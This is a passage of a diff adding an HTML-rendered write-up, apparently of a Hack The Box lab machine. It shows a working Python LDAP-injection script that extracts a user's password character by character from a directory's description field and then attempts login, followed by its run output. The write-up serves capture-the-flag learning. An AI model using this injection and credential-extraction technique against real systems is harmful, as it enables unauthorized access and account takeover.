+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;modified_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{FUZZ}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;quote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{found_char}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Testing &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; for URL: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modified_url&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;modified_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status_code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;technician&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestException&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Request failed: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;test_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Found char: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;. Resetting iteration&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;found_chars&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://internal.analysis.htb/Users/list.php&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;login_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://internal.analysis.htb/employees/login.php&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;technician@analysis.htb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;max_rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;How many rounds? &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_lowercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!@#$%^&amp;amp;*()_+=-&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;
+    
+    &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;max_rounds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Round &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; password is: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;. Attempting login...&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;can_login&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;try_login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can_login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Login successful!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-] Round &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; login attempt failed with password &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[*] Starting round &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; assuming next character in password is &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%2A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+    
+
+    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unquote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Password is: &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here’s the output:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python ldapinject.py
+How many rounds? 2
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+Testing @ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%40&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing &lt;span class=&quot;c&quot;&gt;# for URL: http://internal.analysis.htb/Users/list.php?name=*)(%26(objectClass=user)(description=97NTtl%2A4QP96Bv%23*)&lt;/span&gt;
+Testing &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%24&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing % &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%25&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing ^ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%5E&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing &amp;amp; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%26&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%2A&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Testing &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;URL: http://internal.analysis.htb/Users/list.php?name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;%26&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;objectClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;97NTtl%2A4QP96Bv%28&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
